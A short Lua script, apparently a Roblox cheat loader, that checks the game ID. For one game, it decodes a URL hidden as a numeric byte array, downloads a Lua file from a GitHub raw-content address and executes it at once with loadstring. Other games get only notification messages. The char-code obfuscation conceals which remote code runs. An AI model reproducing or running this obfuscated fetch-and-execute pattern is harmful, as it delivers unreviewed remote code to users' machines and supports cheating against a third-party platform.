local _0xD=function(b)local r=""for i=1,#b do r=r..string.char(b[i])end return r end
local _a = game.GameId
if _a == 6809578891 then
    local user = game.Players.LocalPlayer.Name
    loadstring(game:HttpGet(_0xD({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,105,116,101,99,104,98,111,105,47,98,105,122,122,97,114,101,104,105,106,105,110,107,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,104,105,110,106,105,107,115,101,46,108,117,97,63,116,61})..os.time()))()
elseif _a == 73885730 then
    notify("Check it", "Ui scrapped wait for a rework update", 5)
else
    notify("Check it", "This game is not supported.", 5)
end
